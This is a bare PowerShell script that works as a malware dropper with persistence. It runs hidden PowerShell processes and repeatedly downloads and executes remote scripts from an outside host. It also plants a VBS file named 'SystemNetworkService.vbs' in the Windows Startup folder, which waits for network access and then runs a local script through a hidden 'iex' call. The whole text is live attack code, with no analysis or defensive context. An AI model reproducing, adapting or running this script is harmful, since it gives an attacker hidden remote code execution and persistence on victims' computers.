cd c:\users\public\
start-process -FilePath powershell "-w hidden ./log.ps1"
start-process -FilePath powershell "-w hidden ./get.ps1"
while($z=1){
 $logpath = Test-Path "c:\users\public\log.ps1";
 $getpath = Test-Path "c:\users\public\get.ps1";
 $start = "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemNetworkService.vbs";
 $startvbs = Test-Path $start;
 $selfpath = Test-Path "c:\users\public\self.ps1"
if($logpath -eq "True")
 {}
 Else
 {
  (New-object System.Net.WebClient).DownloadFile('http://fq.wc.lt/up/1463304777.ps1','c:\users\public\log.ps1');
start-process -FilePath powershell "-w hidden ./log.ps1"
 }
if($getpath -eq "True")
 {}
 Else
 {
  (New-object System.Net.WebClient).DownloadFile('http://fq.wc.lt/up/1465392155.ps1','c:\users\public\get.ps1');
start-process -FilePath powershell "-w hidden ./get.ps1"
 }
if($startvbs -eq "True")
{}
Else
 {
  "Dim wmi"|Out-File -force $start
  "Set ws=CreateObject(`"WScript.Shell`")"|Out-File -append -force $start
  "Set wmi=GetObject(`"winmgmts://./root/cimv2`")"|Out-File -append -force $start
  "do"|Out-File -append -force $start
  "Set xxx=wmi.ExecQuery(`"Select * From Win32_PingStatus Where Address='www.baidu.com'`")"|Out-File -append -force $start
  "For Each u in xxx"|Out-File -append -force $start
  "If u.statuscode = 0 Then"|Out-File -append -force $start
  "Exit Do"|Out-File -append -force $start
  "End If"|Out-File -append -force $start
  "Next"|Out-File -append -force $start
  "loop"|Out-File -append -force $start
  "wscript.sleep 500"|Out-File -append -force $start
  "ws.run `"powershell -nop -w hidden -c iex(Get-Content c:\users\public\self.ps1|out-String)`",0"|Out-File -append -force $start
 }
Start-Sleep -Seconds 10
}